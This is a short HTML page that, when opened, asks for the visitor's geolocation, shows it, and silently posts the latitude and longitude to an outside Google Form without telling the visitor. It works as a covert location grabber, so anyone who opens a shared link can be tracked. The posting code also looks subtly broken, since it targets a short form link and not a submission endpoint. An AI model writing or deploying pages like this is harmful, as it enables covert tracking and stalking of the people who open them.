<!DOCTYPE html>
<html>
<head>
  <title>Capture Location</title>
</head>
<body>
  <h1>Capture Your Location</h1>
  <p id="status"></p>
  <p id="location"></p>
  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
      } else {
        document.getElementById("status").innerText = "Geolocation is not supported by this browser.";
      }
    }

    function showPosition(position) {
      var lat = position.coords.latitude;
      var lon = position.coords.longitude;
      document.getElementById("location").innerText = "Latitude: " + lat + ", Longitude: " + lon;

      // Send data to Google Form
      sendLocationToForm(lat, lon);
    }

    function showError(error) {
      switch(error.code) {
        case error.PERMISSION_DENIED:
          document.getElementById("status").innerText = "User denied the request for Geolocation.";
          break;
        case error.POSITION_UNAVAILABLE:
          document.getElementById("status").innerText = "Location information is unavailable.";
          break;
        case error.TIMEOUT:
          document.getElementById("status").innerText = "The request to get user location timed out.";
          break;
        case error.UNKNOWN_ERROR:
          document.getElementById("status").innerText = "An unknown error occurred.";
          break;
      }
    }

    function sendLocationToForm(lat, lon) {
      var formUrl = "https://forms.gle/nbm4D8ic3oRbaGY27"; // Your Google Form URL
      var formData = {
        "entry.610101942": lat, // Latitude field ID
        "entry.1015638874": lon  // Longitude field ID
      };

      var xhr = new XMLHttpRequest();
      xhr.open("POST", formUrl, true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send(Object.keys(formData).map(key => `${key}=${encodeURIComponent(formData[key])}`).join('&'));
    }

    // Automatically get the location when the page loads
    window.onload = getLocation;
  </script>
</body>
</html>
